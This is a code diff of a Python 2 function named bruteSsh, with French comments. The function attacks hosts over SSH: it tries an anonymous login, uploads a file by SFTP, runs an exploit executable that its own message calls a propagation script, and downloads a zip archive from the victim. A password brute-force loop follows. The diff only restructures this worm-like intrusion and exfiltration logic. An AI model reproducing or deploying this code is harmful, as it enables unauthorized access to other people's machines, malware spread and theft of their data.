@@ -189,24 +189,18 @@ def bruteSsh(ip): #BruteForce SSH + envoi de binaires + execution + récupérati
 	#paramiko.util.log_to_file("paramiko.log")
 	ssh = paramiko.SSHClient()
 	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-	for password in passwords:
-		try:
-			ssh.connect(ip,port=22,username="Anonymous",password="")
-			print "[*] Connexion Anonyme établie, envoi et execution du script de propagation"
-		except:
-			print "[*] Authentiofication anonyme echouée, démmarage du bruteforce"
-		try:
-			sftp = ssh.open_sftp()
-			sftp.put(source,destination)
-			stdin, stdout, stderr = ssh.exec_command('start exploit_locale.exe')
-			time.sleep(5)
-			sftp.get(remotezip,tolocalzip)
-			break
-		
-		except:
-			print "[*] erreur lors du transfert sftp"
-			break
-		ssh.close()
+
+	try:
+		ssh.connect(ip,port=22,username="Anonymous",password="")
+		print "[*] Connexion Anonyme établie, envoi et execution du script de propagation"
+		sftp = ssh.open_sftp()
+		sftp.put(source,destination)
+		stdin, stdout, stderr = ssh.exec_command('start exploit_locale.exe')
+		time.sleep(5)
+		sftp.get(remotezip,tolocalzip)
+	except:
+		print "[*] Authentiofication anonyme echouée, démmarage du bruteforce"
+	ssh.close()
 
 	
 	for password in passwords:	
